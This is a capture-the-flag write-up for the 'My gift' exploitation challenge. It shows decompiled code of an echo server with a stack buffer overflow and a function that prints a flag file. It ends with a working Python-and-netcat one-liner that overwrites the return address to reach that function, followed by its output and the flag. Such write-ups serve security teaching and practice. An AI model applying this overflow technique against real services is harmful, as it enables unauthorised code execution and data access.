## My gift (Exploit, 200p, 59 solves)

[Binary](exp200.bin) contains simple echo-server with buffer overflow vulnerability at 0x400C42 (recv).

    char buf[72]; // [sp+0h] [bp-68h]@1
        
    // ...
    while ( 1 )
    {
        // ... (some buffer zeroing)
        readed = recv(sockfd, buf, 300uLL, 0);
        if ( readed < 0 )
            break;
        puts(buf);
        fflush(0LL);
        if ( buf[0] != 's' 
          || buf[1] != 't' 
          || buf[2] != 'o' )
        {
            usleep(0x7D0u);
        }
        else
        {
            usleep(0x7D0u);
            if ( buf[4] == 'p' )
                return;
        }
    }
    return;

It's trivial to see that recv allows to read 300 bytes using 72-byte buffer. We can also notice, that any string starting with "sto?p" will break the loop and cause return from function.

But it's not everything. At 400B90, we can found this nice routine:

    void __noreturn sub_400B90()
    {
        FILE *fd; // rax@1
        const char *buf; // [sp+0h] [bp-18h]@1
        size_t n; // [sp+8h] [bp-10h]@1
     
        buf = 0LL;
        n = 0LL;
        fd = fopen("gift", "r");
        getline((char **)&buf, &n, fd);
        puts(buf);
        fflush(stdout);
        free((void *)buf);
        _exit(1);
    }
  
So everything we need to do is to overwrite return address with 0x400B90 using recv.

    $ python -c 'import struct; print "stoop" + 99*"x" + struct.pack("<Q", 0x400b90)' | tr -d '\n' | nc 10.13.37.22 1337
    
    stoopxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�
                         @
    DCTF{53827349d071f72d5cbcc37d3a14ca39}

